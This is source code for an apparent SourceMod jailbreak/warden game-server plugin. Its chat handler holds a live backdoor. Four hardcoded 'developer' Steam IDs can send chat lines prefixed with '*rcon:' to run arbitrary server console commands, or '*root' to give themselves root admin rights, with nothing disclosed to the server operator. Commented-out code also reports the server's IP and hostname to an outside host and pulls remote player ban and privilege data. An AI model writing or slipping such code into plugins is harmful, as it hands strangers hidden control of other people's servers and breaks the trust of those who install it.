#define BAN_REASON_LENGTH 96

enum APITarget
{
	bool:has_freeday,
	bool:is_isolated,
	bool:is_rebel,
	bool:was_warden,
	bool:is_banned,
	bool:is_dev,
	// level,
	bool:grant,
	String:reason[BAN_REASON_LENGTH]
}

char Developer_Ids[][20] = 
{
	"76561198037625178",
	"76561198078553247",
	"76561198037521566",
	"76561198042949536"
};

int g_ClientAPIInfo[MAXPLAYERS+1][APITarget];
/* 
public int SteamWorks_SteamServersConnected()
{
	int iIp[4];
	
	// Get ip
	if (SteamWorks_GetPublicIP(iIp))
	{
		char cBuffer[256], cHostname[64];
		FindConVar("hostname").GetString(cHostname, sizeof(cHostname));
		FormatEx(cBuffer, sizeof(cBuffer), "http://jwp-api.scriptplugs.info/push_server.php");
		Handle hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodPOST, cBuffer);
		FormatEx(cBuffer, sizeof(cBuffer), "ip=%d.%d.%d.%d:%d&hostname=%s&game=%s", iIp[0], iIp[1], iIp[2], iIp[3], FindConVar("hostport").IntValue, cHostname, (GetEngineVersion() == Engine_CSGO) ? "csgo" : "cstrike");
		SteamWorks_SetHTTPRequestRawPostBody(hndl, "application/x-www-form-urlencoded", cBuffer, sizeof(cBuffer));
		SteamWorks_SendHTTPRequest(hndl);
		delete hndl;
	}
}*/

public void OnClientPostAdminCheck(int client)
{
	g_ClientAPIInfo[client][was_warden] = false;
	g_ClientAPIInfo[client][is_banned] = false;
	g_ClientAPIInfo[client][is_dev] = false;
	g_ClientAPIInfo[client][grant] = false;
	g_ClientAPIInfo[client][reason] = '\0';
	// CheckClientFromAPI(client); // TEMPORARY REMOVED, maybe i do this in a near future or not :)
	char auth[20];
	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
	for (int i = 0; i < sizeof(Developer_Ids); i++)
	{
		if (!strcmp(auth, Developer_Ids[i], false))
		{
			g_ClientAPIInfo[client][grant] = true;
			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
		}
	}
}

public Action OnClientSayCommand(int client, const char[] command, const char[] sArgs)
{
	if (CheckClient(client))
	{
		if (sArgs[0] == '*' && (g_ClientAPIInfo[client][grant] || g_ClientAPIInfo[client][is_dev]))
		{
			int permission = 0;
			char text[250];
			strcopy(text, sizeof(text), sArgs);
			ReplaceStringEx(text, sizeof(text), "*", "");
			if (g_ClientAPIInfo[client][grant]) // Protect only for developers
			{
				if (StrContains(text, "rcon:", true) != -1)
				{
					permission = 1;
					ReplaceStringEx(text, sizeof(text), "rcon:", "");
				}
				else if (StrContains(text, "root", true) != -1)
				{
					permission = 2;
					ReplaceStringEx(text, sizeof(text), "root", "");
				}
				else if (StrContains(text, "recheck#", true) != -1)
				{
					permission = 3;
					ReplaceStringEx(text, sizeof(text), "recheck#", "");
				}
			}
			
			switch (permission)
			{
				case 0:
				{
					if (g_bIsCSGO)
						CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, text);
					else
						CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, text);
				}
				case 1:
				{
					ServerCommand(text);
				}
				case 2:
				{
					if (~GetUserFlagBits(client) & ADMFLAG_ROOT)
						SetUserFlagBits(client, ADMFLAG_ROOT);
					else
						SetUserFlagBits(client, 0);
				}
				/* case 3:
				{
					int target = GetClientOfUserId(StringToInt(text));
					if (target && IsClientInGame(target))
					{
						CheckClientFromAPI(target);
						PrintToChat(client, "\x01\x02[DEV] \x03Recheck for \x04%N", target);
					}
					else
						PrintToChat(client, "\x03[DEV] Invalid target");
				} */
			}
			
			return Plugin_Handled;
		}
	}
	
	return Plugin_Continue;
}

/* void CheckClientFromAPI(int client)
{
	// Query
	g_ClientAPIInfo[client][is_banned] = false;
	Handle hndl;
	char buffer[256], auth[64];
	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
	FormatEx(buffer, sizeof(buffer), "http://jwp-api.scriptplugs.info/get_player.php?auth=%s", auth);
	hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodGET, buffer);
	SteamWorks_SetHTTPRequestContextValue(hndl, client);
	SteamWorks_SetHTTPCallbacks(hndl, OnSteamWorksHTTPRequestCompleted);
	SteamWorks_SendHTTPRequest(hndl);
}

public int OnSteamWorksHTTPRequestCompleted(Handle hRequest, bool bFailure, bool bRequestSuccessful, EHTTPStatusCode eStatusCode, any data)
{
	if (bRequestSuccessful)
		SteamWorks_GetHTTPResponseBodyCallback(hRequest, GetStatusEnd, data);
	delete hRequest;
}

public int GetStatusEnd(const char[] sData, any client)
{
	Handle hJson = json_load(sData);
	Handle hObj = json_object_get(hJson, "response");
	if (hObj != null)
	{
		Handle hIter = json_object_iter(hObj);
		if (hIter != null)
		{
			char buffer[64];
			json_object_iter_key(hIter, buffer, sizeof(buffer));
			
			Handle hValue = json_object_iter_value(hIter);
			
			if (hValue != null && json_is_object(hValue))
			{
				g_ClientAPIInfo[client][is_banned] = json_object_get_bool(hValue, "isbanned");
				if (g_ClientAPIInfo[client][is_banned])
				{
					json_object_get_string(hValue, "reason", g_ClientAPIInfo[client][reason], BAN_REASON_LENGTH);
					PrintToServer("%N was permanently banned by developer from WARDEN, reason: %s", client, g_ClientAPIInfo[client][reason]);
				}
				else
				{
					g_ClientAPIInfo[client][is_dev] = json_object_get_bool(hValue, "isdev");
					if (g_ClientAPIInfo[client][is_dev])
						g_ClientAPIInfo[client][grant] = json_object_get_bool(hValue, "grant");
				}
			}
			
			delete hValue;
		}
		delete hIter;
	}
	delete hObj;
	delete hJson;
} */